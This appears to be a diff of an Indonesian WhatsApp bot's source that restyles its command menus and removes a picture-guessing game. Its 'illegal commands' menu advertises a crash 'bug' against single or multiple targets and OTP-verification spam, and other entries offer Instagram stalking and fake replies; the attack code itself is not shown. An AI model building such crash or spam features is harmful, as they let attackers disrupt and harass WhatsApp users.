-│ ${smallText(".tictactoe")} → ${boldText("𝐁𝐞𝐫𝐦𝐚𝐢𝐧 𝐗 𝐝𝐚𝐧 𝐎")}
-│ ${smallText(".ulartangga")} → ${boldText("𝐌𝐚𝐢𝐧 𝐝𝐞𝐧𝐠𝐚𝐧 𝐭𝐞𝐦𝐚𝐧")}
+├─ 〔 🎮 ɢᴀᴍᴇ 〕
+│ .ᴋᴜɪꜱ
+│ .ᴋᴜɪꜱꜱᴜꜱᴀʜ
+│ .ᴊᴜᴅɪ
+│ .ᴛʀᴜᴛʜ
+│ .ᴅᴀʀᴇ
+│ .ᴛᴇʙᴀᴋ-ᴀᴋᴜ
+│ .ᴛᴇʙᴀᴋʟᴀɢᴜ
+│ .ᴛᴇʙᴀᴋɢᴀᴍʙᴀʀ
+│ .ꜱᴜꜱᴜɴᴋᴀᴛᴀ
+│ .ꜰᴀᴍɪʟʏ𝟏𝟎𝟎
+│ .ᴛᴇʙᴀᴋʙᴇɴᴅᴇʀᴀ
+│ .ᴛɪᴄᴛᴀᴄᴛᴏᴇ
+│ .ᴜʟᴀʀᴛᴀɴɢɢᴀ
 │
-├─ 〔 ${boldText("🏳️‍🌈 𝐅𝐈𝐓𝐔𝐑 𝐋𝐔𝐂𝐔")} 〕
-│ ${smallText(".gay")} → ${boldText("𝐒𝐞𝐛𝐞𝐫𝐚𝐩𝐚 𝐠𝐚𝐲?")}
-│ ${smallText(".lesbi")} → ${boldText("𝐒𝐞𝐛𝐞𝐫𝐚𝐩𝐚 𝐥𝐞𝐬𝐛𝐢?")}
-│ ${smallText(".cantik")} → ${boldText("𝐒𝐞𝐛𝐞𝐫𝐚𝐩𝐚 𝐜𝐚𝐧𝐭𝐢𝐤?")}
-│ ${smallText(".ganteng")} → ${boldText("𝐒𝐞𝐛𝐞𝐫𝐚𝐩𝐚 𝐠𝐚𝐧𝐭𝐞𝐧𝐠?")}
-│ ${smallText(".jodoh")} → ${boldText("𝐂𝐨𝐜𝐨𝐤𝐥𝐨𝐠𝐢 𝐜𝐢𝐧𝐭𝐚")}
-│ ${smallText(".cekkhodam")} → ${boldText("𝐂𝐞𝐤 𝐤𝐡𝐨𝐝𝐚𝐦")}
-│ ${smallText(".cekiq")} → ${boldText("𝐂𝐞𝐤 𝐤𝐞𝐩𝐢𝐧𝐭𝐚𝐫𝐚𝐧")}
-│ ${smallText(".siapa")} → ${boldText("𝐓𝐚𝐫𝐠𝐞𝐭 𝐫𝐚𝐧𝐝𝐨𝐦")}
-│ ${smallText(".fakereply")} → ${boldText("𝐏𝐞𝐬𝐚𝐧 𝐩𝐚𝐥𝐬𝐮")}
-│ ${smallText(".polling")} → ${boldText("𝐁𝐮𝐚𝐭 𝐩𝐨𝐥𝐥𝐢𝐧𝐠")}
+├─ 〔 🏳️‍🌈 ꜰɪᴛᴜʀ ʟᴜᴄᴜ 〕
+│ .ɢᴀʏ
+│ .ʟᴇꜱʙɪ
+│ .ᴄᴀɴᴛɪᴋ
+│ .ɢᴀɴᴛᴇɴɢ
+│ .ᴊᴏᴅᴏʜ
+│ .ᴄᴇᴋᴋʜᴏᴅᴀᴍ
+│ .ᴄᴇᴋɪǫ
+│ .ꜱɪᴀᴘᴀ
+│ .ꜰᴀᴋᴇʀᴇᴘʟʏ
+│ .ᴘᴏʟʟɪɴɢ
 │
-├─ 〔 ${boldText("🧠 𝐀𝐈 𝐀𝐒𝐒𝐈𝐒𝐓𝐀𝐍𝐓")} 〕
-│ ${smallText(".ai")} → ${boldText("𝐓𝐚𝐧𝐲𝐚 𝐤𝐞 𝐀𝐈")}
-│ ${smallText(".aigambar")} → ${boldText("𝐁𝐢𝐤𝐢𝐧 𝐠𝐚𝐦𝐛𝐚𝐫")}
-│ ${smallText(".clear")} → ${boldText("𝐑𝐞𝐬𝐞𝐭 𝐨𝐛𝐫𝐨𝐥𝐚𝐧")}
+├─ 〔 🧠 ᴀɪ ᴀꜱꜱɪꜱᴛᴀɴᴛ 〕
+│ .ᴀɪ
+│ .ᴀɪɢᴀᴍʙᴀʀ
+│ .ᴄʟᴇᴀʀ
 │
-├─ 〔 ${boldText("🎵 𝐌𝐔𝐒𝐈𝐂 & 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐑")} 〕
-│ ${smallText(".spotify")} → ${boldText("𝐂𝐚𝐫𝐢 𝐥𝐚𝐠𝐮 𝐒𝐩𝐨𝐭𝐢𝐟𝐲")}
-│ ${smallText(".sound")} → ${boldText("𝐔𝐛𝐚𝐡 𝐭𝐞𝐤𝐬 𝐣𝐚𝐝𝐢 𝐬𝐮𝐚𝐫𝐚")}
-│ ${smallText(".audiovid")} → ${boldText("𝐕𝐢𝐝𝐞𝐨 𝐣𝐚𝐝𝐢 𝐚𝐮𝐝𝐢𝐨")}
-│ ${smallText(".ubahsuara")} → ${boldText("𝐔𝐛𝐚𝐡 𝐬𝐮𝐚𝐫𝐚 𝐮𝐧𝐢𝐤")}
-│ ${smallText(".wm")} → ${boldText("𝐔𝐧𝐝𝐮𝐡 𝐭𝐚𝐧𝐩𝐚 𝐰𝐚𝐭𝐞𝐫𝐦𝐚𝐫𝐤")}
-│ ${smallText(".ttmp3")} → ${boldText("𝐔𝐧𝐝𝐮𝐡 𝐦𝐩𝟑 𝐓𝐢𝐤𝐓𝐨𝐤")}
-│ ${smallText(".ytmp3")} → ${boldText("𝐔𝐧𝐝𝐮𝐡 𝐦𝐩𝟑 𝐘𝐨𝐮𝐭𝐮𝐛𝐞")}
-│ ${smallText(".ytmp4")} → ${boldText("𝐔𝐧𝐝𝐮𝐡 𝐦𝐩𝟒 𝐘𝐨𝐮𝐭𝐮𝐛𝐞")}
+├─ 〔 🎵 ᴍᴜꜱɪᴄ & ᴅᴏᴡɴʟᴏᴀᴅᴇʀ 〕
+│ .ꜱᴘᴏᴛɪꜱʏ
+│ .ꜱᴏᴜɴᴅ
+│ .ᴀᴜᴅɪᴏᴠɪᴅ
+│ .ᴜʙᴀʜꜱᴜᴀʀᴀ
+│ .ᴡᴍ
+│ .ᴛᴛᴍᴘ𝟑
+│ .ʏᴛᴍᴘ𝟑
+│ .ʏᴛᴍᴘ𝟒
 │
-├─ 〔 ${boldText("🖌️ 𝐌𝐀𝐊𝐄𝐑 / 𝐂𝐑𝐄𝐀𝐓𝐎𝐑")} 〕
-│ ${smallText(".stiker")} → ${boldText("𝐔𝐛𝐚𝐡 𝐠𝐚𝐦𝐛𝐚𝐫 𝐣𝐚𝐝𝐢 𝐬𝐭𝐢𝐤𝐞𝐫")}
-│ ${smallText(".qc")} → ${boldText("𝐔𝐛𝐚𝐡 𝐭𝐞𝐤𝐬 𝐣𝐚𝐝𝐢 𝐪𝐮𝐨𝐭𝐞")}
-│ ${smallText(".toimg")} → ${boldText("𝐒𝐭𝐢𝐤𝐞𝐫 𝐤𝐞 𝐠𝐚𝐦𝐛𝐚𝐫")}
-│ ${smallText(".teks")} → ${boldText("𝐓𝐚𝐦𝐛𝐚𝐡 𝐭𝐞𝐤𝐬 𝐝𝐢 𝐬𝐭𝐢𝐤𝐞𝐫")}
-│ ${smallText(".brat")} → ${boldText("𝐌𝐞𝐦𝐛𝐮𝐚𝐭 𝐬𝐭𝐢𝐤𝐞𝐫 𝐤𝐚𝐭𝐚")}
-│ ${smallText(".bratvid")} → ${boldText("𝐌𝐞𝐦𝐛𝐮𝐚𝐭 𝐬𝐭𝐢𝐤𝐞𝐫 𝐯𝐢𝐝𝐞𝐨")}
+├─ 〔 🖌️ ᴍᴀᴋᴇʀ / ᴄʀᴇᴀᴛᴏʀ 〕
+│ .ꜱᴛɪᴋᴇʀ
+│ .ǫᴄ
+│ .ᴛᴏɪᴍɢ
+│ .ᴛᴇᴋꜱ
+│ .ʙʀᴀᴛ
+│ .ʙʀᴀᴛᴠɪᴅ
 │
-├─ 〔 ${boldText("🖼️ 𝐌𝐄𝐃𝐈𝐀")} 〕
-│ ${smallText(".waifu")} → ${boldText("𝐖𝐚𝐢𝐟𝐮 𝐫𝐚𝐧𝐝𝐨𝐦")}
-│ ${smallText(".qr")} → ${boldText("𝐌𝐞𝐦𝐛𝐮𝐚𝐭 𝐐𝐑")}
-│ ${smallText(".pdf")} → ${boldText("𝐌𝐞𝐧𝐠𝐮𝐛𝐚𝐡 𝐟𝐨𝐭𝐨 𝐣𝐚𝐝𝐢 𝐩𝐝𝐟")}
-│ ${smallText(".igstalk")} → ${boldText("𝐌𝐞𝐧𝐠𝐬𝐭𝐚𝐥𝐤𝐢𝐧𝐠 𝐢𝐠 𝐨𝐫𝐚𝐧𝐠")}
-│ ${smallText(".ambilpp")} → ${boldText("𝐌𝐞𝐧𝐠𝐚𝐦𝐛𝐢𝐥 𝐏𝐏 𝐰𝐚")}
-│ ${smallText(".dwfoto")} → ${boldText("𝐔𝐧𝐝𝐮𝐡 𝐟𝐨𝐭𝐨 𝐬𝐞𝐤𝐚𝐥𝐢 𝐥𝐢𝐡𝐚𝐭")}
-│ ${smallText(".dwvideo")} → ${boldText("𝐔𝐧𝐝𝐮𝐡 𝐯𝐢𝐝𝐞𝐨 𝐬𝐞𝐤𝐚𝐥𝐢 𝐥𝐢𝐡𝐚𝐭")}
-│ ${smallText(".mirror")} → ${boldText("𝐂𝐞𝐫𝐦𝐢𝐧 𝐟𝐨𝐭𝐨/𝐯𝐢𝐝𝐞𝐨")}
-│ ${smallText(".rotate")} → ${boldText("𝐔𝐛𝐚𝐡 𝐩𝐨𝐬𝐢𝐬𝐢 𝐟𝐨𝐭𝐨/𝐯𝐢𝐝𝐞𝐨")}
-│ ${smallText(".blur")} → ${boldText("𝐁𝐥𝐮𝐫 𝐰𝐚𝐣𝐚𝐡 𝐟𝐨𝐭𝐨")}
+├─ 〔 🖼️ ᴍᴇᴅɪᴀ 〕
+│ .ᴡᴀɪꜱᴜ
+│ .ǫʀ
+│ .ᴘᴅꜰ
+│ .ɪɢꜱᴛᴀʟᴋ
+│ .ᴀᴍʙɪʟᴘᴘ
+│ .ᴅᴡꜰᴏᴛᴏ
+│ .ᴅᴡᴠɪᴅᴇᴏ
+│ .ᴍɪʀʀᴏʀ
+│ .ʀᴏᴛᴀᴛᴇ
+│ .ʙʟᴜʀ
 │
-├─ 〔 ${boldText("👤 𝐀𝐍𝐎𝐍𝐘𝐌𝐎𝐔𝐒")} 〕
-│ ${smallText(".anonymous")} → ${boldText("𝐂𝐡𝐚𝐭 𝐨𝐫𝐚𝐧𝐠 𝐫𝐚𝐧𝐝𝐨𝐦")}
-│ ${smallText(".anonstatus")} → ${boldText("𝐂𝐞𝐤 𝐬𝐭𝐚𝐭𝐮𝐬 𝐚𝐧𝐭𝐫𝐞𝐚𝐧")}
-│ ${smallText(".stop")} → ${boldText("𝐇𝐞𝐧𝐭𝐢𝐤𝐚𝐧 𝐬𝐞𝐬𝐬𝐢𝐨𝐧 𝐚𝐧𝐨𝐧𝐢𝐦")}
+├─ 〔 👤 ᴀɴᴏɴʏᴍᴏᴜꜱ 〕
+│ .ᴀɴᴏɴʏᴍᴏᴜꜱ
+│ .ᴀɴᴏɴꜱᴛᴀᴛᴜꜱ
+│ .ꜱᴛᴏᴘ
 │
-├─ 〔 ${boldText("👥 𝐅𝐈𝐓𝐔𝐑 𝐆𝐑𝐔𝐏")} 〕
-│ ${smallText(".tagall")} → ${boldText("𝐌𝐞𝐧𝐭𝐢𝐨𝐧 𝐬𝐞𝐦𝐮𝐚 𝐦𝐞𝐦𝐛𝐞𝐫")}
-│ ${smallText(".tag")} → ${boldText("𝐌𝐞𝐧𝐭𝐢𝐨𝐧 𝟏 𝐦𝐞𝐦𝐛𝐞𝐫")}
-│ ${smallText(".setnamagc")} → ${boldText("𝐆𝐚𝐧𝐭𝐢 𝐧𝐚𝐦𝐚 𝐠𝐫𝐮𝐩")}
-│ ${smallText(".setdesgc")} → ${boldText("𝐆𝐚𝐧𝐭𝐢 𝐝𝐞𝐬𝐤𝐫𝐢𝐩𝐬𝐢 𝐠𝐫𝐮𝐩")}
-│ ${smallText(".setppgc")} → ${boldText("𝐆𝐚𝐧𝐭𝐢 𝐟𝐨𝐭𝐨 𝐩𝐫𝐨𝐟𝐢𝐥 𝐠𝐫𝐮𝐩")}
-│ ${smallText(".adminonly")} → ${boldText("𝐒𝐞𝐭𝐭𝐢𝐧𝐠 𝐩𝐞𝐧𝐠𝐚𝐭𝐮𝐫𝐚𝐧 𝐠𝐫𝐮𝐩")}
-│ ${smallText(".linkgc")} → ${boldText("𝐀𝐦𝐛𝐢𝐥 𝐥𝐢𝐧𝐤 𝐠𝐫𝐮𝐩")}
-│ ${smallText(".del")} → ${boldText("𝐌𝐞𝐧𝐠𝐡𝐚𝐩𝐮𝐬 𝐩𝐞𝐬𝐚𝐧 𝐝𝐢𝐠𝐫𝐮𝐩")}
+├─ 〔 👥 ꜱᴇᴛɪɴɢ ɢʀᴜᴘ 〕
+│ .ᴛᴀɢᴀʟʟ
+│ .ᴛᴀɢ
+│ .ꜱᴇᴛɴᴀᴍᴀɢᴄ
+│ .ꜱᴇᴛᴅᴇꜱɢᴄ
+│ .ꜱᴇᴛᴘᴘɢᴄ
+│ .ᴀᴅᴍɪɴᴏɴʟʏ
+│ .ʟɪɴᴋɢᴄ
+│ .ᴅᴇʟ
 │
-├─ 〔 ${boldText("📊 𝐒𝐊𝐎𝐑 𝐆𝐀𝐌𝐄")} 〕
-│ ${smallText(".skor")} → ${boldText("𝐋𝐢𝐡𝐚𝐭 𝐬𝐤𝐨𝐫 𝐤𝐚𝐦𝐮")}
-│ ${smallText(".kirimskor")} → ${boldText("𝐊𝐢𝐫𝐢𝐦 𝐬𝐤𝐨𝐫 𝐤𝐞 𝐭𝐞𝐦𝐚𝐧")}
+├─ 〔 📊 ꜱᴋᴏʀ ɢᴀᴍᴇ 〕
+│ .ꜱᴋᴏʀ
+│ .ᴋɪʀɪᴍꜱᴋᴏʀ
 │
-├─ 〔 ${boldText("📋 𝐈𝐍𝐅𝐎")} 〕
-│ ${smallText(".shop")} → ${boldText("𝐁𝐮𝐤𝐚 𝐦𝐞𝐧𝐮 𝐬𝐡𝐨𝐩")}
-│ ${smallText(".info")} → ${boldText("𝐈𝐧𝐟𝐨 𝐛𝐨𝐭 & 𝐨𝐰𝐧𝐞𝐫")}
-│ ${smallText(".menu")} → ${boldText("𝐓𝐚𝐦𝐩𝐢𝐥𝐤𝐚𝐧 𝐦𝐞𝐧𝐮 𝐢𝐧𝐢")}
+├─ 〔 📋 ɪɴꜰᴏ 〕
+│ .ꜱʜᴏᴘ
+│ .ɪɴꜰᴏ
+│ .ᴍᴇɴᴜ
 │
-╰── ${boldText("📅")} ${tanggalBold}
+╰── 📅 ${tanggalFormat}
 
-╭─〔 ${boldText("🔐 𝐅𝐈𝐓𝐔𝐑 𝐕𝐈𝐏 / 𝐎𝐖𝐍𝐄𝐑")} 〕─╮
+╭─〔 🔐 ꜰɪᴛᴜʀ ᴠɪᴘ / ᴏᴡɴᴇʀ 〕─╮
 │
-├─ 〔 ${boldText("👥 𝐆𝐑𝐔𝐏 𝐕𝐈𝐏")} 〕
-│ ${smallText(".kick")} → ${boldText("𝐊𝐢𝐜𝐤 𝐮𝐬𝐞𝐫")}
-│ ${smallText(".mute")} → ${boldText("𝐌𝐮𝐭𝐞 𝐮𝐬𝐞𝐫")}
-│ ${smallText(".unmute")} → ${boldText("𝐁𝐮𝐤𝐚 𝐦𝐮𝐭𝐞")}
-│ ${smallText(".ban")} → ${boldText("𝐁𝐚𝐧 𝐮𝐬𝐞𝐫")}
-│ ${smallText(".unban")} → ${boldText("𝐁𝐮𝐤𝐚 𝐛𝐚𝐧")}
-│ ${smallText(".antilink")} → ${boldText("𝐃𝐢𝐥𝐚𝐫𝐚𝐧𝐠 𝐤𝐢𝐫𝐢𝐦 𝐥𝐢𝐧𝐤")}
-│ ${smallText(".antifoto")} → ${boldText("𝐃𝐢𝐥𝐚𝐫𝐚𝐧𝐠 𝐤𝐢𝐫𝐢𝐦 𝐟𝐨𝐭𝐨")}
-│ ${smallText(".antistiker")} → ${boldText("𝐃𝐢𝐥𝐚𝐫𝐚𝐧𝐠 𝐤𝐢𝐫𝐢𝐦 𝐬𝐭𝐢𝐤𝐞𝐫")}
+├─ 〔 👥 ɢʀᴜᴘ ᴠɪᴘ 〕
+│ .ᴋɪᴄᴋ
+│ .ᴍᴜᴛᴇ
+│ .ᴜɴᴍᴜᴛᴇ
+│ .ʙᴀɴ
+│ .ᴜɴʙᴀɴ
+│ .ᴀɴᴛɪʟɪɴᴋ
+│ .ᴀɴᴛɪꜰᴏᴛᴏ
+│ .ᴀɴᴛɪꜱᴛɪᴋᴇʀ
 │
-├─ 〔 ${boldText("📊 𝐒𝐊𝐎𝐑 𝐊𝐇𝐔𝐒𝐔𝐒")} 〕
-│ ${smallText(".setskor")} → ${boldText("𝐀𝐭𝐮𝐫 𝐬𝐤𝐨𝐫 𝐮𝐬𝐞𝐫")}
-│ ${smallText(".setexp")} → ${boldText("𝐀𝐭𝐮𝐫 𝐞𝐱𝐩 𝐮𝐬𝐞𝐫")}
-│ ${smallText(".setlevel")} → ${boldText("𝐀𝐭𝐮𝐫 𝐥𝐞𝐯𝐞𝐥 𝐮𝐬𝐞𝐫")}
-│ ${smallText(".allskor")} → ${boldText("𝐊𝐢𝐫𝐢𝐦 𝐬𝐤𝐨𝐫 𝐤𝐞 𝐬𝐞𝐦𝐮𝐚")}
-│ ${smallText(".tantangan")} → ${boldText("𝐌𝐞𝐦𝐛𝐞𝐫𝐢 𝐬𝐤𝐨𝐫 𝐤𝐞 𝐠𝐫𝐮𝐩")}
+├─ 〔 📊 ꜱᴋᴏʀ ᴋʜᴜꜱᴜꜱ 〕
+│ .ꜱᴇᴛꜱᴋᴏʀ
+│ .ꜱᴇᴛᴇxᴘ
+│ .ꜱᴇᴛʟᴇᴠᴇʟ
+│ .ᴀʟʟꜱᴋᴏʀ
+│ .ᴛᴀɴᴛᴀɴɢᴀɴ
 │
-├─ 〔 ${boldText("👑 𝐕𝐈𝐏 𝐂𝐎𝐍𝐓𝐑𝐎𝐋")} 〕
-│ ${smallText(".setvip")} → ${boldText("𝐉𝐚𝐝𝐢𝐤𝐚𝐧 𝐕𝐈𝐏")}
-│ ${smallText(".unsetvip")} → ${boldText("𝐂𝐚𝐛𝐮𝐭 𝐕𝐈𝐏")}
-│ ${smallText(".listvip")} → ${boldText("𝐃𝐚𝐟𝐭𝐚𝐫 𝐕𝐈𝐏")}
-│ ${smallText(".listskor")} → ${boldText("𝐃𝐚𝐟𝐭𝐚𝐫 𝐒𝐊𝐎𝐑")}
-│ ${smallText(".umumkan")} → ${boldText("𝐏𝐞𝐧𝐠𝐮𝐦𝐮𝐦𝐚𝐧 𝐝𝐢 𝐆𝐫𝐮𝐩")}
-│ ${smallText(".stikercustom")} → ${boldText("𝐁𝐮𝐚𝐭 𝐬𝐭𝐢𝐤𝐞𝐫 𝐜𝐮𝐬𝐭𝐨𝐦")}
+├─ 〔 👑 ᴠɪᴘ ᴄᴏɴᴛʀᴏʟ 〕
+│ .ꜱᴇᴛᴠɪᴘ
+│ .ᴜɴꜱᴇᴛᴠɪᴘ
+│ .ʟɪꜱᴛᴠɪᴘ
+│ .ʟɪꜱᴛꜱᴋᴏʀ
+│ .ᴜᴍᴜᴍᴋᴀɴ
+│ .ꜱᴛɪᴋᴇʀᴄᴜꜱᴛᴏᴍ
 │
-├─ 〔 ${boldText("👑 𝐎𝐖𝐍𝐄𝐑")} 〕
-│ ${smallText(".allvip")} → ${boldText("𝐉𝐚𝐝𝐢𝐤𝐚𝐧 𝐬𝐞𝐦𝐮𝐚 𝐕𝐈𝐏")}
-│ ${smallText(".clearvip")} → ${boldText("𝐇𝐚𝐩𝐮𝐬 𝐬𝐞𝐦𝐮𝐚 𝐕𝐈𝐏")}
-│ ${smallText(".setoff")} → ${boldText("𝐌𝐞𝐧𝐠𝐚𝐭𝐮𝐫 𝐣𝐚𝐝𝐰𝐚𝐥 𝐛𝐨𝐭 𝐦𝐚𝐭𝐢")}
+├─ 〔 👑 ᴏᴡɴᴇʀ 〕
+│ .ᴀʟʟᴠɪᴘ
+│ .ᴄʟᴇᴀʀᴠɪᴘ
+│ .ꜱᴇᴛᴏꜰꜰ
 │
-├─ 〔 ${boldText("⚙️ 𝐁𝐎𝐓 𝐂𝐎𝐍𝐓𝐑𝐎𝐋")} 〕
-│ ${smallText(".on")} → ${boldText("𝐀𝐤𝐭𝐢𝐟𝐤𝐚𝐧 𝐛𝐨𝐭")}
-│ ${smallText(".off")} → ${boldText("𝐍𝐨𝐧𝐚𝐤𝐭𝐢𝐟𝐤𝐚𝐧 𝐛𝐨𝐭")}
+├─ 〔 ⚙️ ʙᴏᴛ ᴄᴏɴᴛʀᴏʟ 〕
+│ .ᴏɴ
+│ .ᴏꜰꜰ
 │
-╰── ${boldText("👑 𝐎𝐰𝐧𝐞𝐫:")} @${OWNER_NUMBER?.split('@')[0] || '6283836348226'}`),
-        mentions: [OWNER_NUMBER]
+╰── 👑 ᴏᴡɴᴇʀ: ꜰᴀᴊᴀʀ`),
     });
     return;
 }
 
-// ✨ MENU ILEGAL - BOLD FONT VERSION
+// ==================== MENU ILEGAL ====================
 if (body.startsWith('.menuilegal') || body.startsWith('.m')) {
     await sock.sendMessage(from, {
-        text: boldText(`┌─𝐈𝐋𝐋𝐄𝐆𝐀𝐋 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒─┐
+        text: font(`┌─ ɪʟʟᴇɢᴀʟ ᴄᴏᴍᴍᴀɴᴅꜱ ─┐
 │
-│  ⚡ ${smallText(".bug")}
-│     ${boldText("𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐜𝐫𝐚𝐬𝐡 - 𝐬𝐢𝐧𝐠𝐥𝐞 𝐭𝐚𝐫𝐠𝐞𝐭")}
+│  ⚡ .ʙᴜɢ
+│     ᴘᴀʏᴍᴇɴᴛ ᴄʀᴀꜱʜ - ꜱɪɴɢʟᴇ ᴛᴀʀɢᴇᴛ
 │
-│  💀 ${smallText(".bug2")}
-│     ${boldText("𝐌𝐮𝐥𝐭𝐢-𝐭𝐚𝐫𝐠𝐞𝐭 𝐚𝐭𝐭𝐚𝐜𝐤")}
+│  💀 .ʙᴜɢ𝟐
+│     ᴍᴜʟᴛɪ-ᴛᴀʀɢᴇᴛ ᴀᴛᴛᴀᴄᴋ
 │
-│  🔥 ${smallText(".spamcode")}
-│     ${boldText("𝐎𝐓𝐏 𝐯𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧 𝐬𝐩𝐚𝐦")}
+│  🔥 .ꜱᴘᴀᴍᴄᴏᴅᴇ
+│     ᴏᴛᴘ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ ꜱᴘᴀᴍ
 │
-└─ 👑 ${boldText("𝐎𝐰𝐧𝐞𝐫:")} @${OWNER_NUMBER?.split('@')[0] || '6283836348226'}`),
-        mentions: [OWNER_NUMBER]
+└─ 👑 ᴏᴡɴᴇʀ: ꜰᴀᴊᴀʀ`),
     });
 }
 
@@ -9430,81 +8198,6 @@ Ketik *.tebaklagu* untuk mencoba lagi.`
     }
 }
 
-if (text.trim() === '.tebakgambar') {
-    await sock.sendMessage(from, { react: { text: '🧩', key: msg.key } });
-
-    const res = await fetch('https://api.siputzx.my.id/api/games/tebakgambar');
-    if (!res.ok) {
-        return sock.sendMessage(from, {
-            text: '❌ Gagal mengambil soal tebak gambar.'
-        });
-    }
-
-    const json = await res.json();
-    const soal = json.data;
-
-    const sent = await sock.sendMessage(from, {
-        image: { url: soal.img },
-        caption: `🧩 *TEBAK GAMBAR DIMULAI!*
-
-📌 *Petunjuk:* ${soal.deskripsi || '-'}
-
-✍️ Jawab dengan menuliskan jawaban
-(dengan mereply gambar ini)
-⏱️ Waktu 30 detik!`
-    });
-
-    const timeout = setTimeout(async () => {
-        sesiTebakGambar.delete(sent.key.id);
-        await sock.sendMessage(from, {
-            text: `⏰ *Waktu habis!*
-
-✅ Jawaban yang benar adalah:
-*${soal.jawaban}*`
-        });
-    }, 30000);
-
-    sesiTebakGambar.set(sent.key.id, {
-        jawaban: soal.jawaban.trim(),
-        timeout
-    });
-
-    return;
-}
-
-if (msg.message?.extendedTextMessage?.contextInfo?.stanzaId) {
-    const replyId = msg.message.extendedTextMessage.contextInfo.stanzaId;
-
-    if (sesiTebakGambar.has(replyId)) {
-        const sesi = sesiTebakGambar.get(replyId);
-        clearTimeout(sesi.timeout);
-        sesiTebakGambar.delete(replyId);
-
-        const jawabanUser = text.trim();
-        const benar =
-            jawabanUser.toLowerCase() === sesi.jawaban.toLowerCase();
-
-        if (benar) {
-            tambahSkor(sender, from, 30);
-            await sock.sendMessage(from, {
-                text: `✅ *Benar!* Jawabanmu adalah *${sesi.jawaban}* 🎉
-🏆 Kamu mendapatkan *+30 poin!*
-
-Mau main lagi? Ketik *.tebakgambar*`
-            });
-        } else {
-            await sock.sendMessage(from, {
-                text: `❌ *Salah!*
-Jawabanmu: *${jawabanUser}*
-✅ Jawaban benar: *${sesi.jawaban}*
-
-Ketik *.tebakgambar* untuk mencoba lagi.`
-            });
-        }
-        return;
-    }
-}
-
 
 if (text.trim().toLowerCase() === '.blur') {
     const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
@@ -9565,6 +8258,8 @@ if (text.trim().toLowerCase() === '.blur') {
 
     return;
 }
+
+
 
     });
 }
